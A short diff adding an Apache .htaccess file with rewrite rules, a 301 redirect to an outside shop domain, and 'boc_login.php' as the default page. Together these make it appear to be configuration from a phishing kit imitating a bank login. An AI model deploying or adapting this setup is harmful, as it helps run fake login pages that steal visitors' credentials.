@@ -1,0 +1,19 @@
+RewriteEngine On
+
+RewriteRule ^$ /view/ [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_URI} !^/view/
+RewriteRule ^(.*)$ /view/$1
+
+RewriteCond %{SCRIPT_FILENAME} -d
+RewriteRule ^view/(.*[^/])$ http://www.mexi-marquet.shop/$1/ [R=301]
+
+DirectoryIndex boc_login.php
+
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule !.*\.php$ %{REQUEST_FILENAME}.php [QSA,L]
+
+RewriteCond %{REQUEST_FILENAME}.html -f
+RewriteRule !.*\.php$ %{REQUEST_FILENAME}.html [QSA,L]
